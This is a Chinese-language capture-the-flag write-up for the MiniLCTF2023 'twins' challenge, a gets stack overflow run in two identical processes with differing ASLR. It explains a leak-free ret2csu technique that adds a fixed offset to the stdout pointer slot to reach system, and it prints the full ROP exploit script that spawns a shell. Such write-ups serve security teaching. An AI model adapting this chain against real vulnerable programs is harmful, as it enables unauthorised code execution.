# MiniLCTF2023 - twins

## 题目简述

`twins.py` 同时启动两个相同的无 PIE 程序，把每行输入发送给二者，并逐行比较输出；任何差异都会终止会话。子程序存在 `gets` 栈溢出，保护为 Partial RELRO、无 Canary、NX、无 PIE。普通“泄露 libc 后 ret2libc”会失败，因为两个进程的 ASLR 基址不同，泄露地址自然不同。

## 解题过程

主程序 `.bss` 起点 `0x404040` 是 `stdout` 的 copy relocation，两个进程中该槽都保存各自 libc 的 `_IO_2_1_stdout_` 指针。虽然绝对地址不同，但 `system - _IO_2_1_stdout_` 的相对差值固定。程序中还有：

```text
0x40115c: add dword ptr [rbp - 0x3d], ebx; nop; ret
0x40127a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
```

先用 CSU pop gadget 控制 `rbx` 和 `rbp`，让 `add` gadget 修改 `stdout` 槽的低 32 位，将它从 `_IO_2_1_stdout_` 调整到 `system`。两个进程执行完全相同的相对加法，因此无需泄露基址。随后使用 ret2csu 的间接调用 `call [r15 + rbx*8]` 调用 `.bss` 槽；该 CSU 版本把 `r12d`、`r13`、`r14` 依次送入 `edi`、`rsi`、`rdx`。

同一个任意 32 位加法原语还可以在 `.bss` 空白处分两次构造 `/bin/sh\0`。官方 exp 的核心结构如下：

```python
ret = 0x401284
add_gadget = 0x40115c
pop_csu = 0x40127a
call_csu = 0x401257
stdout_slot = 0x404040
command = 0x404080


def add32(address, value):
    return flat(
        pop_csu,
        value & 0xffffffff,
        address + 0x3d,
        0, 0, 0, 0,
        add_gadget,
    )


def call_ptr(slot, rdi, rsi=0, rdx=0):
    return flat(
        pop_csu,
        0, 1, rdi, rsi, rdx, slot,
        call_csu,
        0, 0, 0, 0, 0, 0, 0,
    )


payload = b"A" * 0x18
payload += p64(ret)
payload += add32(command, 0x6e69622f)       # /bin
payload += add32(command + 4, 0x0068732f)   # /sh\0
payload += add32(
    stdout_slot,
    libc.sym.system - libc.sym._IO_2_1_stdout_,
)
payload += call_ptr(stdout_slot, command)

io.sendlineafter(b"name?\n", payload)
io.interactive()
```

Partial RELRO 也允许 ret2dlresolve 作为非预期路线，但相对指针修补更直接体现题目的双进程约束。官方材料未保存最终远程 flag 回包。

## 方法总结

多实例输出一致性会阻止绝对地址泄露，但不会破坏模块内部的相对偏移。寻找已初始化的 libc 指针槽，再用算术 gadget 做“基址无关”的指针变换，是此类题的核心思路。所有 ROP 输出也必须保持确定性；只要链中打印出进程特有地址，包装器就会发现差异。
